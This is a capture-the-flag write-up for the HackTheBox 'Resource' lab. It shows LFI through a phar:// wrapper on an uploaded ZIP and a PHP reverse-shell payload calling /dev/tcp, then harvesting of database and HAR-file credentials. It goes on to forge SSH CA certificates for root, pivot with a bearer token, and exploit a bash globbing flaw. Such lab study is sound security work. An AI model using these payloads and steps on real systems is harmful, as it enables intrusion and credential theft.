# HackTheBox - Resource

![Screenshot0](./screenshots/Resource.png)

<br>
<br>

## Table of Contents

- [Foreword](#Foreword)
- [Enumeration](#Enumeration)
    - [Portscan](#Portscan)
	- [Webserver](#Webserver)
- [Foothold](#Foothold)
	- [LFI](#LFI)
	- [Internal Path Disclosure](#Internal-Path-Disclosure)
	- [PHP Wrapper](#PHP-Wrapper)
	- [Phar Wrapper Exploitation](#Phar-Wrapper-Exploitation)
	- [Reverse-Shell](#Reverse-Shell)
- [User](#User)
	- [System Enumeration - ITRC](#System-Enumeration---ITRC)
	- [Credential Harvesting](#Credential-Harvesting)
	- [User - msainristil](#User---msainristil)
	- [Privilege Escalation - 172.223.0.3](#Privilege-Escalation---172.223.0.3)
- [root](#root)
	- [Pivot -> 172.223.0.1](#Pivot-->-172.223.0.1)
	- [System Enumeration - SSG](#System-Enumeration---SSG)
	- [Horizontal Privilege Escalation](#Horizontal-Privilege-Escalation)
	- [Final Privilege Escalation](#Final-Privilege-Escalation)
- [Conclusion](#Conclusion)

## Foreword

Resource was my second hard ranked box which I had solved.

However, with two hints from a buddy and a look at the forum discussion, I didn't want to be deprived of the learning opportunity to drop the challenge after a long try&error and frustration phase instead of learning from it with a little nudge in the right direction.

The box was a great playground for learning how public key infrastructures work and what can happen if they are completely compromised.

## Enumeration

### Portscan

As always, it starts with a standard port scan.

__Command:__ `nmap -p- -T4 -sV <IP>`

![Screenshot0](./screenshots/0.png)

We see three open ports, one open web server port on 80 and two SSH ports.

The fact that we have a second SSH port on number `2222` is interesting.

<br>

### Webserver

So the first thing I did was look at the web server, but we need to add the domain `itrc.ssg.htb` to the `/etc/hosts` file first. 

![Screenshot1](./screenshots/1.png)

Now we can visit the website and we see the page of a __SSG IT Resource Center__.

![Screenshot2](./screenshots/2.png)

We can read what our fictitious company offers for these services and see a login / registration option.

I now enumerated the page using various tools and manually looked at the options with our created test user.

![Screenshot3](./screenshots/3.png)

We have a dashboard where we can submit tickets for the support team.
When creating a ticket we can also upload zip archive attachments.

![Screenshot4](./screenshots/4.png)

The page we are on is controlled by the GET parameter `page=`.

![Screenshot5](./screenshots/5.png)

Using this I found an admin portal via `page=admin` which I could access with my normal testuser.

![Screenshot6](./screenshots/6.png)

<br>
<br>
<br>

## Foothold

Now that I have thoroughly enumerated the site and made a note of the various options, I moved on to different exploitation attempts.

And that was a long process and I was in the rabbit hole for a long time...

For example, I was sure that the `page=admin` board must have something like an SSRF vulnerability, or a hidden function.

![Screenshot7](./screenshots/7.png)

![Screenshot8](./screenshots/8.png)

Well....here my attempts came to nothing for a long time.

<br>

### LFI

So I went to the `page=` parameter and tried to understand its behavior and detect anomalies.

For example, it was interesting to see that passing a page like `page=doesNotExist` redirects us to the dashboard by default.

Whereas `?page=./ticket` behaves exactly like `?page=ticket` and stays on the page.

![Screenshot9](./screenshots/9.png)

So I turned my focus to LFI exploitation attempts.

This was followed by a long period of trial and error using known exploit techniques, attempts to encode the payloads and so on.

<br>

### Internal Path Disclosure

At some point while trying to work with internal PHP wrappers I encountered the following error.

![Screenshot10](./screenshots/10.png)

A function `file_exists()` throws us an error and also brings us a interesting piece of information exploitation: __Internal Path Disclosure__.

Knowing the complete internal path can be necessary or advantageous for some exploit techniques.

Let's test this by calling `?page=var/www/itrc/admin`.

![Screenshot11](./screenshots/11.png)

Looks good!

<br>

### PHP Wrapper

So let's go back to the PHP wrappers.

We can enumerate which PHP wrappers we can use by simply passing the name of the wrapper to the GET parameter followed by `://`.

If the wrapper does not exist or is disabled we will get the error as seen before.

<br>

### Phar Wrapper Exploitation

Well, we are able to work with certain wrappers in the parameter and we can also upload ZIP archives.
So the question is how we can exploit this.

The following Github resource gave me the exploitation idea: [Tricky-ways-to-exploit-PHP-Local-File-Inclusion](https://github.com/qazbnm456/awesome-security-trivia/blob/master/Tricky-ways-to-exploit-PHP-Local-File-Inclusion.md)

First, I tried the __POC__ in the following way.

We create a simple PHP file on our attacker machine:

```php
<?php phpinfo(); ?>
```

We pack these as a ZIP archive and upload them to a ticket that we open.

![Screenshot12](./screenshots/12.png)

We get the location of the uploaded ZIP file when we hover over the link of the attachment.

![Screenshot13](./screenshots/13.png)

And finally we can call them up as follows.

__URL:__ `http://itrc.ssg.htb/?page=phar://uploads/<HASH_FROM_APPLICATION>.zip/info`

![Screenshot14](./screenshots/14.png)

Hooray, that looks good!

With a slash `/` we get the packed file from the uploaded zip archive and enter `info` to call the `info.php` of our POC contained in it.

It is important to note that we omit a `.php` at the end, as the application in the background already appends this.

<br>

### Reverse Shell

OK, to get a reverse shell I repeated the game again with the following PHP wrapped code:

```php
<?php system("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/9001 0>&1'"); ?>
```

I got a reverse shell as `www-data`.

![Screenshot15](./screenshots/15.png)

Afterwards only a short shell stabilization to have a secure shell with which we can work better.

- `/usr/bin/script -qc /bin/bash /dev/null`
- `[CTRL] + [Z]`
- `stty raw -echo`
- `fg`

<br>
<br>
<br>

## User

### System Enumeration - ITRC

Now that I finally had a reverse shell after a long time, many attempts and retries, I enumerated the most important things on the system.

We are currently operating as `www-data` user and need the user flag.

There are two Linux users on the system.

![Screenshot16](./screenshots/16.png)

Interesting were the netcommands like `ifconfig` or an arp lookup which show us that we have a docker container setup with multiple IP's.

![Screenshot17](./screenshots/17.png)

<br>

### Credential Harvesting

In our current directory of the user `www-data` there is a file which contains the access data to the MySQL database which is located on the container & IP `resource-db.docker_resource (172.223.0.2)`.

![Screenshot18](./screenshots/18.png)

So I logged into the database on the other container.

![Screenshot19](./screenshots/19.png)

The following tables were available.

![Screenshot20](./screenshots/20.png)

The first thing I did, of course, was to get bcrypt hashes from the user table, but cracking them is not going to work.

![Screenshot21](./screenshots/21.png)

Interesting was the `messages` table and its conversations, which gave me the idea to examine the uploaded ZIP files.

![Screenshot22](./screenshots/22.png)

__Messages:__

```
MariaDB [resourcecenter]> SELECT * FROM tickets;
+----+----------------------------------------------+--------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------------+---------------------------------------------------------+--------------------------------+
| id | subject                                      | status | body                                                                                                                                                                                                                                                             | created_at          | submitted_by | attachment                                              | attachment_name                |
+----+----------------------------------------------+--------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------------+---------------------------------------------------------+--------------------------------+
|  1 | Need SSH Access to HR Server                 | closed | I need to access the HR server to update the employee handbook.                                                                                                                                                                                                  | 2024-02-01 08:09:21 |            3 | ../uploads/e8c6575573384aeeab4d093cc99c7e5927614185.zip | pubkey-mgraham-please-sign.zip |
|  2 | Decommission ITRC SSH Certificate            | closed | We need to decommission the old ITRC SSH certificate infrastructure in favor of the new organization-wide IT signing certs. I'm handling the transition to the new system from the ITSC-side. Mike - Can you handle removing the old certs from the ITRC server? | 2024-02-02 13:12:11 |            1 | NULL                                                    | NULL                           |
|  3 | Malware in finance dept                      | open   | We have detected malware on the finance department server. We need to take it offline and clean it.                                                                                                                                                              | 2024-02-03 14:12:11 |            4 | NULL                                                    | NULL                           |
|  4 | Please provision access to marketing servers | closed | I'm new to the IT team, need access to the marketing servers in order to apply updates and configure firewall. Public key attached.                                                                                                                              | 2024-02-04 13:27:27 |            5 | ../uploads/eb65074fe37671509f24d1652a44944be61e4360.zip | mcgregor_pub.zip               |
|  5 | SSH Key Signing Broken                       | open   | The admin panel is supposed to allow me to get a signed certficate, but it just isn't working.                                                                                                                                                                   | 2024-02-04 14:19:54 |            2 | NULL    

<SNIP>
```

I extracted the textfile and a file named `itrc.ssg.htb.har` appeared.

![Screenshot23](./screenshots/23.png)

A HAR file is an HTTP request archive file which stores requests in JSON format.

There might be some juicy information here.

I searched through the file and found the password of the user `msainristil` in a recorded POST parameter.

![Screenshot24](./screenshots/24.png)

<br>

### User - msainristil

I now logged in as user `msainristil`.

![Screenshot25](./screenshots/25.png)

But still no flag in sight...

However, there was something very interesting in our user's home folder, namely a private CA key. 

With this ca-key, we can sign other public keys, which are trusted by systems and thus possibly gain access as other users, services or even pivot to other systems.

<br>

### Privilege Escalation - 172.223.0.3

In the following way we can now sign ourselves as ANY Other user a public key which is accepted by our local SSH server.

__1. Create RSA Keypair:__

```bash
ssh-keygen -f mykey -t rsa
```

__2. Sign Key:__

```bash
ssh-keygen -s ca-itrc -I "hacker" -n root mykey.pub
```

__3. Login:__

```bash
ssh -i mykey root@localhost
```

Now I was root in the container 172.223.0.3 and got the user flag in the home directory of the user `zzinter`. 

![Screenshot26](./screenshots/26.png)

<br>
<br>
<br>

## root

So... that was a good piece of work up to here.

I often got lost, it took me a long time to get on the right track with the web-exploitation and now I am root in the container with a user flag.

The root part wasn't any easier for me personally, it was just as difficult and time-consuming.

First of all, I ran into rabbit holes with the usual Docker breakout techniques...

<br>

### Pivot -> 172.223.0.1

In the home directory of `zzinter` we have a script called `sign_key_api.sh` whose content I put here completely.

__sign_key_api.sh__

```bash
#!/bin/bash

usage () {
    echo "Usage: $0 <public_key_file> <username> <principal>"
    exit 1
}

if [ "$#" -ne 3 ]; then
    usage
fi

public_key_file="$1"
username="$2"
principal_str="$3"

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

public_key=$(cat $public_key_file)

curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
```

Okay the script obviously interacts with the other container set up `signserv.ssg.htb` with the IP `172.223.0.1`.

![Screenshot27](./screenshots/27.png)

The script expects a public key file, a name and a principal.

First I thought in the direction of web vulnerabilities and tried various web exploitations via burp.

And then I suspected that the signing would continue and that we could gain access to other things.

Until it worked there was a lot of try & error, but here briefly the steps as they worked.

__1. Create RSA Keypair:__

```bash
ssh-keygen -f support -t rsa
```

__2. Sign Key:__

```bash
./sign_key_api.sh support.pub support support > support-cert.pup
```

__3. Login:__

```bash
ssh support@172.223.0.1 -i support -o CertificateFile=support-cert.pub -p 2222
```

And at some point it worked!

![Screenshot28](./screenshots/28.png)

Well...but I was only a user on this other docker system and not root.

<br>

### System Enumeration - SSG

So I continued to enumerate the system in the new container.

It was interesting, for example, that we also have the user `zzinter` here.

![Screenshot29](./screenshots/29.png)

Furthermore, we have another interesting script, which is of no use to us as our current user 'support'.

![Screenshot30](./screenshots/30.png)

But the user `zzinter` can work with it.

Well I was stuck again until I came across this thing.

When I looked into the SSH configuration and everything that had to do with it, I found the following interesting files under `/etc/ssh/auth_principals/`.

![Screenshot31](./screenshots/31.png)

These are principals which are checked for the respective users.

So in short, we should be able to sign a certificate as user `zzinter` using the previous method, but we need to specify the correct principal `zzinter_temp`.

<br>

### Horizontal Privilege Escalation

Now again the signing process from the __ITRC__ machine to land us as `zzinter` on the __SSG__ machine:

And I had written a little helper script here called `sign_helper.sh`:

__sign_helper.sh:__

```bash
#!/bin/bash

usage () {
    echo "Usage: $0 <public_key_file> <username> <principal>"
    exit 1
}

#Check Args
if [ "$#" -ne 3 ]; then
    usage
fi

public_key_file="$1"
username="$2"
principal_str="$3"

#Check if public key exists
if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

# Load Public Key
public_key=$(cat "$public_key_file")

# Signingrequest to SigningService
curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal_str"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
```

And here are the following three steps to get access to __SSG__.

__1. Create RSA Keypair:__

```bash
ssh-keygen -f zzinter -t rsa
```
__2. Sign Key:__

```bash
./sign_helper.sh zzinter.pub zzinter zzinter_temp >> zzinter-cert.pub
```

__3. Login:__

```bash
ssh zzinter@172.17.0.1 -i zzinter -o CertificateFile=zzinter-cert.pub -p 2222
```

![Screenshot33](./screenshots/32.png)

And here we are as `zzinter` user on the `ssg` machine.

The user flag is of no use to us, we now have to perform one last privilege escalation to get full root on the host machine.

<br>

### Final Privilege Escalation

And this is where the `sign_key.sh` script under `/opt` comes into action.

__sign_key.sh__

```bash
#!/bin/bash

usage () {
    echo "Usage: $0 <ca_file> <public_key_file> <username> <principal> <serial>"
    exit 1
}

if [ "$#" -ne 5 ]; then
    usage
fi

ca_file="$1"
public_key_file="$2"
username="$3"
principal_str="$4"
serial="$5"

if [ ! -f "$ca_file" ]; then
    echo "Error: CA file '$ca_file' not found."
    usage
fi

itca=$(cat /etc/ssh/ca-it)
ca=$(cat "$ca_file")
if [[ $itca == $ca ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if ! [[ $serial =~ ^[0-9]+$ ]]; then
    echo "Error: '$serial' is not a number."
    usage
fi

ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principal" "$public_key_file"
```

And we can also execute this as root as shown by `sudo -l`.

Sounds good, but there's a little hitch in this thing.

![Screenshot34](./screenshots/34.png)

The script does not let us sign with the CA file we need to get root and refers to the API.
And when we try to sign a root certificate for the SSG machine with the API, we get a similar reference to the script here.

A kind of dilemma.

I was stuck for a long time and after a long period of frustration I got a nudge in the right direction from a friend to take a closer look at the script.

The script suffers on a so-called __Bash Globbing Vulnerability__.

I wrote a [script](./exploit.sh) to extract the sensitive CA-IT file character by character via this vulnerability and save it in a file `evil.txt`

This took a bit of time and after a while I had completely extracted the `ca-it` file and was able to use it to sign in to root and FINALLY get the last root flag.

<br>

Here are the steps:


__1. Create RSA Keypair:__

```bash
ssh-keygen -f root -t rsa
```

__2. Run Exploit Script:__

```bash
./exploit.sh
```

![Screenshot35](./screenshots/35.png)

__3. Sign:__

```bash
ssh-keygen -s evil.txt -z 1337 -I root -V -1w:forever -n root_user root.pub
```

__4. Login:__

```bash
ssh -o CertificateFile=root-cert.pub -i root root@localhost -p 2222
```

And there it is!

The final root flag!

![Screenshot36](./screenshots/36.png)

<br>
<br>
<br>

## Conclusion

Resource was a pretty interesting box with a cool setup that I had never seen before.

It took several attempts over a week or so in different parts and a nudge in the right direction here and there.

What I would like to take away from the box for myself personally is that it's okay to get hints after a long period of frustration, otherwise you may lose out on learning experiences.

<br>
